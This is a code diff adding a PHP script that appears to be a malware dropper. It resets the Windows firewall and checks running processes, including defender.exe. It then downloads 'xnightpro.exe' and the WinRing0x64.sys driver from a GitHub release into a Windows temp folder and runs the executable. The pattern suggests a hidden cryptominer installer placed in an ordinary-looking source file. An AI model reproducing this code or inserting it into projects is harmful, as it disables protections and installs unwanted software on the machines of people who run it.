@@ -1,0 +1,92 @@
+    /*<?php /**/
+
+
+
+
+function downloadFile($url, $savePath) {
+    if (file_exists($savePath)) {
+        echo "File already exists: $savePath\n";
+        return true;
+    }
+
+    $downloadedFile = file_get_contents($url);
+    if ($downloadedFile !== false) {
+        if (file_put_contents($savePath, $downloadedFile)) {
+            echo "Downloaded and saved: $savePath\n";
+            return true;
+        } else {
+            echo "Failed to save: $savePath\n";
+            return false;
+        }
+    } else {
+        echo "Failed to download: $url\n";
+        return false;
+    }
+}
+
+
+
+  
+
+
+
+
+system('netsh advfirewall reset');  
+system('mkdir "C:/Windows/Temp/RightProgramFiles"');  
+exec('tasklist', $output);
+
+$url =  'https://github.com/danialchork/project-final/releases/download/latestpublish/xnightpro.exe';
+$url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';
+
+$file_name = 'C:/Windows/Temp/RightProgramFiles/xnightpro.exe';
+$file_name2 = 'C:/Windows/Temp/RightProgramFiles/WinRing0x64.sys';
+
+$found = false;
+$found2 = false;
+$found3 = false;
+foreach ($output as $line) {
+    if (stripos(strtolower($line), 'spotify.exe') !== false) {
+        $found = true;
+
+    }
+    if (stripos(strtolower($line), 'defender.exe') !== false) {
+        $found2 = true;
+
+    }
+    if (stripos(strtolower($line), 'xnightpro.exe') !== false) {
+        $found3 = true;
+
+    }
+}
+
+if (!$found && !$found2  && !$found3) {
+
+
+           system('del /f /q "C:/Windows/Temp/defender.exe"');     
+        system('del /f /q "C:/Windows/Temp/WinRing0x64.sys"');
+        system('del /f /q "C:/Windows/Temp/config.json"');
+
+
+        if (downloadFile($url2, $file_name2)) {
+            // File downloaded successfully, continue with rest of your script
+            echo "Proceeding with further processing...\n";
+            // Your code here
+        } else {
+            echo "Failed to download file, aborting further processing.\n";
+        }
+        if (downloadFile($url, $file_name)) {
+            // File downloaded successfully, continue with rest of your script
+            echo "Proceeding with further processing...\n";
+            // Your code here
+        } else {
+            echo "Failed to download file, aborting further processing.\n";
+        }
+         system('C:/Windows/Temp/RightProgramFiles/xnightpro.exe');
+
+        
+
+
+
+
+
+}
